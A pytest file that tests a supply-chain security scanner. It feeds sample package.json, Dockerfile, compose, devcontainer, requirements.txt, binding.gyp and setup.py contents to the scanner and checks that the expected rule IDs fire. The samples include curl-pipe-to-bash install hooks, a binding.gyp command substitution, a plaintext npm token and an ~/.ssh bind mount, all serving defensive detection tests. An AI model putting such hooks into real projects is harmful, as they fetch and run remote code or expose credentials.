from pathlib import Path

from agent_security_scanner.models import FileContext
from agent_security_scanner.rules.supply_chain import SupplyChainRule


def scan_supply_chain(text: str, filename: str):
    return SupplyChainRule().scan(FileContext(path=Path(filename), relative_path=filename, text=text))


def test_detects_package_lifecycle_and_risky_script():
    findings = scan_supply_chain(
        """
        {
          "scripts": {
            "postinstall": "curl https://example.com/install.sh | bash"
          }
        }
        """,
        "package.json",
    )

    assert {finding.rule_id for finding in findings} >= {"SC001", "SC002"}


def test_detects_remote_and_unpinned_package_dependencies():
    findings = scan_supply_chain(
        """
        {
          "dependencies": {
            "left-pad": "*",
            "tool": "git+https://github.com/example/tool.git"
          }
        }
        """,
        "package.json",
    )

    assert {finding.rule_id for finding in findings} >= {"SC003", "SC004"}


def test_detects_package_manager_plaintext_credential():
    findings = scan_supply_chain("//registry.npmjs.org/:_authToken=npm_secret_token", ".npmrc")

    assert any(finding.rule_id == "SC005" for finding in findings)


def test_detects_dockerfile_supply_chain_risks():
    findings = scan_supply_chain(
        """
        FROM node:latest
        ADD https://example.com/tool /usr/local/bin/tool
        RUN curl https://example.com/install.sh | sh
        """,
        "Dockerfile",
    )

    assert {finding.rule_id for finding in findings} >= {"SC006", "SC007", "SC008"}


def test_detects_compose_privileged_and_sensitive_mount():
    findings = scan_supply_chain(
        """
        services:
          app:
            image: alpine
            privileged: true
            volumes:
              - /var/run/docker.sock:/var/run/docker.sock
        """,
        "docker-compose.yml",
    )

    assert {finding.rule_id for finding in findings} >= {"SC009", "SC010"}


def test_detects_devcontainer_lifecycle_and_mount_risks():
    findings = scan_supply_chain(
        """
        {
          "postCreateCommand": "curl https://example.com/setup.sh | bash",
          "mounts": ["source=${localEnv:HOME}/.ssh,target=/home/vscode/.ssh,type=bind"]
        }
        """,
        "devcontainer.json",
    )

    assert {finding.rule_id for finding in findings} >= {"SC011", "SC012"}


def test_detects_requirements_remote_and_unpinned_dependencies():
    findings = scan_supply_chain(
        """
        requests
        git+https://github.com/example/pkg.git
        """,
        "requirements.txt",
    )

    assert {finding.rule_id for finding in findings} >= {"SC013", "SC014"}


def test_detects_binding_gyp_command_substitution():
    findings = scan_supply_chain(
        """
        {
          "variables": {
            "payload": "<!(node -e \\"require('child_process').execSync('whoami')\\")"
          }
        }
        """,
        "binding.gyp",
    )

    assert any(finding.rule_id == "SC015" for finding in findings)


def test_detects_setup_py_suspicious_command_execution():
    findings = scan_supply_chain(
        """
        from setuptools import setup
        import os
        os.system("curl https://example.com/install.sh | bash")
        setup(name="demo")
        """,
        "setup.py",
    )

    assert any(finding.rule_id == "SC016" for finding in findings)


def test_safe_setup_py_is_not_flagged():
    findings = scan_supply_chain(
        """
        from setuptools import setup
        setup(name="demo", version="1.0.0")
        """,
        "setup.py",
    )

    assert not any(finding.rule_id == "SC016" for finding in findings)
